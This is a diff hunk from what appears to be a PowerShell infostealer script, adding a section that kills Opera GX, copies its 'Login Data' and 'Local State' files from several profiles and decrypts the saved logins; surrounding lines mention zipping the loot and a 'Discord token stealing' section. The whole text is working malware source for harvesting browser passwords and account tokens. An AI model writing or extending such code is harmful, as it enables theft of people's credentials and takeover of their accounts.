@@ -205,6 +205,38 @@ if (Test-Path $decryptExe) {
     Write-Host "decrypt.exe deleted before zipping."
 }
 
+# Configuration for Opera GX
+$operaGXProfiles = @("Default", "Profile 1", "Profile 2")
+$operaGXDir = "$env:APPDATA\Opera Software\Opera GX Stable"
+$operaGXFilesToCopy = @("Login Data", "Local State")
+
+KillBrowserProcesses "opera"
+
+foreach ($profile in $operaGXProfiles) {
+    $profileDir = Join-Path -Path $operaGXDir -ChildPath $profile
+    if (Test-Path $profileDir) {
+        CopyBrowserFiles "Opera GX" $profileDir $profile $operaGXFilesToCopy
+    } else {
+        Write-Host "Opera GX - Profile $profile not found."
+    }
+}
+
+# Now copy Local State for each profile in Opera GX
+$operaGXLocalStateSource = Join-Path -Path $operaGXDir -ChildPath "Local State"
+if (Test-Path $operaGXLocalStateSource) {
+    foreach ($profile in $operaGXProfiles) {
+        $browserDestDir = Join-Path -Path $destDir -ChildPath "Opera GX\$profile"
+        Copy-Item -Path $operaGXLocalStateSource -Destination $browserDestDir -Force
+        Write-Host "Opera GX - Profile $profile - Local State copied."
+    }
+}
+
+# Decrypt login data after copying
+foreach ($profile in $operaGXProfiles) {
+    DecryptLoginData "Opera GX" $profile
+}
+
+
 # Discord token stealing
 $discordPaths = @(
     "$env:APPDATA\Discord\Local Storage\leveldb",
